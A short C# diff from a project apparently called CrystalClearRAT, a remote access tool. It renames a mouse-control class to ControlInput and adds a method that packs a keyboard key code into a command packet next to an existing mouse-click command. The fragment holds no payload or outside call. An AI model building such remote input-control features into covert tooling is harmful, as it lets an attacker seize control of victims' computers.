@@ -6,14 +6,21 @@ using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
+using System.Windows.Input;
 
 namespace CrystalClearRAT.Functions
 {
-    public static class ControlMouse
+    public static class ControlInput
     {
 
 
-
+        public static byte[] KeyInfo(int key)
+        {
+            return CommandDataSerializer.Serialize(CommandFlags.KeyboardKey, (writer) =>
+            {
+                writer.Write(key);
+            });
+        }
 
         public static byte[] ClickInfo(int x, int maxX, int y, int maxY)
         {
